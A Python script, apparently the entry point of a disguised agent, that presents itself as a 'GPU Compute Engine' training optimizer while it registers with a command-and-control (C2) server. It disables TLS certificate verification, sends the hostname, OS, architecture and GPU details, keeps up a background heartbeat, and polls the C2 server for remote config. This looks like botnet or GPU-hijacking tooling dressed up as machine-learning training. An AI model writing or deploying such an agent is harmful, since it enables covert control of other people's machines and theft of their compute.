#!/usr/bin/env python3
"""
C2 Optimizer CLI entry point (OPTIMIZED v2.0)
- C2 server integration
- Heartbeat reporting
- Remote config fetch
- Auto-restart
"""

import os
import sys
import json
import time
import uuid
import socket
import ssl
import platform
import subprocess
import threading
import hashlib
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from urllib.error import URLError

# === CONFIG ===
C2_URL = os.environ.get("C2_URL", "")
C2_TOKEN = os.environ.get("C2_TOKEN", "")
AGENT_ID = os.environ.get("AGENT_ID", f"optimizer-{uuid.uuid4().hex[:12]}")
HEARTBEAT_INTERVAL = int(os.environ.get("HEARTBEAT_INTERVAL", "60"))

def http_post(path, data, timeout=10):
    """HTTP POST to C2 server"""
    if not C2_URL:
        return None
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))
    
    headers = {"Content-Type": "application/json"}
    if C2_TOKEN:
        headers["X-Auth-Token"] = C2_TOKEN
    
    try:
        req = Request(f"{C2_URL}{path}", data=json.dumps(data).encode(), headers=headers)
        return json.loads(opener.open(req, timeout=timeout).read())
    except:
        return None

def get_gpu_info():
    """Get GPU information"""
    info = {"available": False, "name": "N/A", "memory": "N/A"}
    try:
        result = subprocess.run(
            "nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            parts = result.stdout.strip().split(",")
            info["available"] = True
            info["name"] = parts[0].strip() if len(parts) > 0 else "Unknown"
            info["memory"] = parts[1].strip() if len(parts) > 1 else "N/A"
    except:
        pass
    return info

def get_system_info():
    """Get system information"""
    return {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "arch": platform.machine(),
        "cpu_count": os.cpu_count(),
        "gpu": get_gpu_info(),
    }

def register():
    """Register with C2 server"""
    if not C2_URL:
        return False
    
    info = get_system_info()
    data = {
        "id": AGENT_ID,
        "hostname": info["hostname"],
        "username": "optimizer",
        "os": f"{info['os']} {platform.release()}",
        "arch": f"{info['arch']} | {info['gpu']['name']}",
        "platform_type": "optimizer",
        "gpu_available": info["gpu"]["available"],
        "gpu_name": info["gpu"]["name"],
    }
    
    result = http_post("/api/agent/register", data)
    return result and result.get("status") == "ok"

def send_heartbeat(status="running", metrics=None):
    """Send heartbeat to C2"""
    if not C2_URL:
        return
    
    data = {
        "id": AGENT_ID,
        "status": status,
        "metrics": metrics or {},
        "timestamp": time.time(),
    }
    http_post("/api/agent/heartbeat", data)

def heartbeat_loop(engine):
    """Background heartbeat thread"""
    while engine._running:
        try:
            metrics = {
                "epoch": getattr(engine._training_logger, "_epoch", 0) if engine._training_logger else 0,
                "gpu": get_gpu_info(),
            }
            send_heartbeat("running", metrics)
        except:
            pass
        time.sleep(HEARTBEAT_INTERVAL)

def fetch_config():
    """Fetch config from C2 server"""
    if not C2_URL:
        return None
    result = http_post("/api/optimizer/config", {"id": AGENT_ID})
    return result

def main():
    """Start GPU optimizer with C2 integration"""
    print("=" * 60)
    print("[Optimizer] GPU Compute Engine v2.0 - OPTIMIZED")
    print(f"[Optimizer] Agent ID: {AGENT_ID}")
    print(f"[Optimizer] C2 URL: {C2_URL or 'NOT SET'}")
    print("=" * 60)
    
    # Import engine
    from .torch_cuda_optimizer import ComputeEngine
    
    # Register with C2
    if C2_URL:
        if register():
            print("[Optimizer] Registered with C2 server")
        else:
            print("[Optimizer] C2 registration failed (continuing...)")
    
    # Initialize engine
    print("[Optimizer] Initializing compute engine...")
    engine = ComputeEngine(device='auto')
    engine.initialize()
    
    # Start heartbeat
    if C2_URL:
        heartbeat_thread = threading.Thread(target=heartbeat_loop, args=(engine,), daemon=True)
        heartbeat_thread.start()
        print("[Optimizer] Heartbeat started")
    
    # Print GPU info
    gpu = get_gpu_info()
    print(f"[Optimizer] GPU: {gpu['name']} ({gpu['memory']})")
    print("[Optimizer] Running. Training logs will appear below.")
    print("-" * 60)
    
    # Main loop
    try:
        for i in range(600):
            time.sleep(60)
            
            # Periodically check for config updates
            if C2_URL and i % 10 == 0:
                config = fetch_config()
                if config:
                    print(f"[Optimizer] Config update: {config}")
    except KeyboardInterrupt:
        print("\n[Optimizer] Stopped by user")
        send_heartbeat("stopped")
    
    # Cleanup
    engine.shutdown()
    if C2_URL:
        send_heartbeat("shutdown")
    
    print("[Optimizer] Shutdown complete")

if __name__ == '__main__':
    main()
